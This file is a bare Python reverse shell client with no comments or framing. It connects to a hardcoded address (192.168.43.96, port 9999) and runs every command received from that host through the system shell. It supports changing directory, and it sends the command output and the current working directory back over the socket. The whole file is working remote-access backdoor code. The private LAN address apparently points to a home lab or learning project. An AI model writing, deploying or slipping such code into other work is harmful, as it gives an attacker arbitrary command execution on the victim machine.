import socket
import os
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.43.96"
port = 9999

s.connect((host,port))

while True:
    
    data = s.recv(1024)
    
    if data[:2].decode("utf-8") =="cd":
        os.chdir(data[3:].decode("utf-8"))
        
    if data.decode('utf-8') == "end":
    	s.close()
    	break
        
    if len(data) >0:
        cmd = subprocess.run(data.decode("utf-8"),capture_output = True, shell = True ,text = True)
        
        if cmd.stderr == None:
            output = cmd.stdout
        else:
            output = cmd.stdout + cmd.stderr
            
        cwd =  str(os.getcwd()) + "~: "
        s.send(str.encode((cwd + output), "UTF-8"))
        print(output)
        
